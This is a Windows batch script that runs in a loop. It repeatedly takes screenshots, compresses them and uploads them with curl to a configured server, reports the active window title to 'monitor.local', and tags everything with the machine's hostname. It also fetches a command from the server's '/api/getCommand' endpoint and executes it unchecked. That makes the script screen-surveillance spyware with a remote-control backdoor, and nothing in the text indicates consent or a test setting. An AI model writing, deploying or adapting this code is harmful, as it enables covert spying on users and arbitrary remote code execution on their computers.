rem main.bat
set /p endpoint=<endpoint
set /p yesterday=<date
echo %date% > today
set /p today=<today
if NOT "%yesterday%" == "%today%" (
echo %date% > date
del *.jpg
) 

nircmd.exe savescreenshot test.jpg
set interval=60000
hostname>c:/host.txt
set /p USER=<c:/host.txt
set form="pc=%USER%"
set header="User: %USER%"
:loop
FOR /F %%i IN ('dir *jpg /b /O-D') DO (
    SET file=%%i
    GOTO send
)
:send

curl -F "data=@%file%" -F %form% %endpoint%/api/photo
set fn=%random%.jpg
nircmd.exe cmdwait %interval% savescreenshot %fn%
magick.exe mogrify -resize 1366x768 -format jpg -quality 10 %fn%
curl %endpoint%/api/status > status
set /p status=<status
IF "%status%"=="%USER%" (set interval=10000) ELSE (set interval=60000)

curl %endpoint%/api/getCommand/%USER% > temp.txt
set /p CMD=< temp.txt
%CMD%

for /f %%i in ('powershell.exe -file ./tabs.ps1') do  set lastproc=%%i


for /f "tokens=9 skip=1 delims=," %%i in ('tasklist /fi "imagename eq %lastproc%.exe" /fo csv /v') do curl -X POST -H "Content-Type: text/plain" -H %header% --data-raw %%i http://monitor.local/api/save & goto done
:done

goto loop